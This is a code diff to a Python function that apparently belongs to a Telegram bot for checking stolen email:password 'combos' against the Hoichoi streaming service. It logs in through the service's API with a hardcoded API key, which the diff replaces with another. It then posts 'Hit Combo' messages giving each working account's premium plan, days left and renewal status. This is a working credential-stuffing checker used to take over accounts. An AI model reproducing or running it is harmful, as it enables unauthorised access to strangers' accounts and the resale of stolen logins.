@@ -16,7 +16,9 @@ def hoichoi_helper(chat_id, combo):
         inpumail = combo_split[0]
         inpupass = combo_split[1]
     except IndexError:
-        return Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
+        print(combo)
+        Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
+        return
     email= f'"email":"{inpumail}"'
     password = f'"password":"{inpupass}"'
     session_request = requests.Session()
@@ -41,7 +43,7 @@ def hoichoi_helper(chat_id, combo):
     'authorization': user_token,
     'origin': 'https://www.hoichoi.tv',
 'referer':'https://www.hoichoi.tv/',
-'x-api-key':'dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3',
+'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef'
 }
     url2 = 'https://prod-api.viewlift.com/subscription/user?site=hoichoitv&userId=f76c181a-94b5-11eb-a8b3-0242ac130003'
     session2 = session_request.get(url2, headers=head2)
@@ -52,3 +54,4 @@ def hoichoi_helper(chat_id, combo):
     pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Hoichoi</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {result2["subscriptionPlanInfo"]["name"]}\nDays Left: {trial.days}\nRecurring: {result2["subscriptionPlanInfo"]["renewable"]}</b>'
     Editmessage(chat_id, pro_message, status)
     return
+
